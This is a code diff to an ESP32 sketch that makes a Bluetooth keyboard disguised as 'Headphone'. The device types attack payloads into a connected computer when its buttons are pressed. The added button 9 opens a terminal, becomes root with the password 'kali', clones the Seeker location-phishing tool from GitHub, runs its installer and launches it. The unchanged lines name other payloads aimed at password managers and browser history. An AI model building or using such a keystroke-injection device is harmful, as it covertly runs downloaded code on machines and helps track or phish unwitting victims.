@@ -8,6 +8,7 @@
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Restart)
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: HiddenWave)
+#define BUTTON_9_PIN 27 // Button 9 (Trigger: Seeker)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -20,6 +21,7 @@ bool lastState5 = HIGH;
 bool lastState6 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
+bool lastState9 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -38,7 +40,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 8 Triggers on Buttons 1-8 (Pins 16, 17, 18, 19, 21, 22, 23, 25)...");
+  Serial.println("Starting BLE HID setup with 9 Triggers on Buttons 1-9 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -48,6 +50,7 @@ void setup() {
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -65,6 +68,7 @@ void loop() {
     bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
+    bool state9 = digitalRead(BUTTON_9_PIN);
 
     // Button 1: Password Manager (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -211,6 +215,41 @@ void loop() {
       Serial.println("HiddenWave Payload executed");
     }
 
+    // Button 9: Seeker (Pin 27)
+    if (lastState9 == HIGH && state9 == LOW) {
+      Serial.println("Button 9: Seeker (Pin 27)");
+      bleKeyboard.press(KEY_LEFT_CTRL); 
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('t'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(5000);
+      sendString("cd Desktop", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("sudo su", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("kali", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("git clone https://github.com/thewhiteh4t/seeker.git", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd seeker", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("chmod +x install.sh", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(2000);
+      sendString("./install.sh", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(30000);
+      sendString("python3 seeker.py", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Seeker Payload executed");
+    }
+
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -219,6 +258,7 @@ void loop() {
     lastState6 = state6;
     lastState7 = state7;
     lastState8 = state8;
+    lastState9 = state9;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
